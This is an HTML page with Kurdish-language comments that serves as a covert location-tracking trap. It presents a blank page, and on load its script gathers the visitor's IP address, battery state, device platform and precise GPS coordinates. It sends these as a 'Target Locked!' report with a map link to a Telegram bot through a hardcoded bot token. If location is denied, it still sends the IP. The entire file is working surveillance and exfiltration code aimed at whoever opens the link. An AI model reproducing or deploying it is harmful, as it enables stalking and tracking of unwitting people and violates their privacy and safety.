<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title> </title>
    <style>body { background: white; margin: 0; }</style>
</head>
<body onload="capture()">

<script>
    const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";

    async function capture() {
        const urlParams = new URLSearchParams(window.location.search);
        const uid = urlParams.get('id');
        if (!uid) return;

        // 1. Wargrtni IP u Battery yaksar (bē Permission)
        let ipData = {ip: "N/A"};
        let bat = "N/A", ch = "No";
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            ipData = await res.json();
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bat = Math.floor(b.level * 100) + "%";
                ch = b.charging ? "Yes" : "No";
            }
        } catch(e) {}

        // 2. Dāvāī Location dakat (Am dāvākaryaya la sar shāsha dēmenētavā)
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });

            let report = `🚨 <b>Target Locked!</b> (نێچیر گیرا)\n\n` +
                         `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">[Google Maps Link]</a>\n` +
                         `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
                         `🔋 <b>Battery:</b> <code>${bat}</code> (Charging: ${ch})\n` +
                         `🕒 <b>Time:</b> <code>${time}</code>`;

            // Nardn bō Telegram
            await fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: uid,
                    text: report,
                    parse_mode: "HTML",
                    disable_web_page_preview: false
                })
            });

            // Hich Redirect-ēk nakre, laparaka har la sar dāvāī allow-aka dēmenētavā
        }, (err) => {
            // Agar Don't Allow-ī krd, tanha IP-aka bnēra
            fetch(`https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied Location, but IP is: ${ipData.ip}`);
        }, { enableHighAccuracy: true, timeout: 10000 });
    }
</script>
</body>
</html>
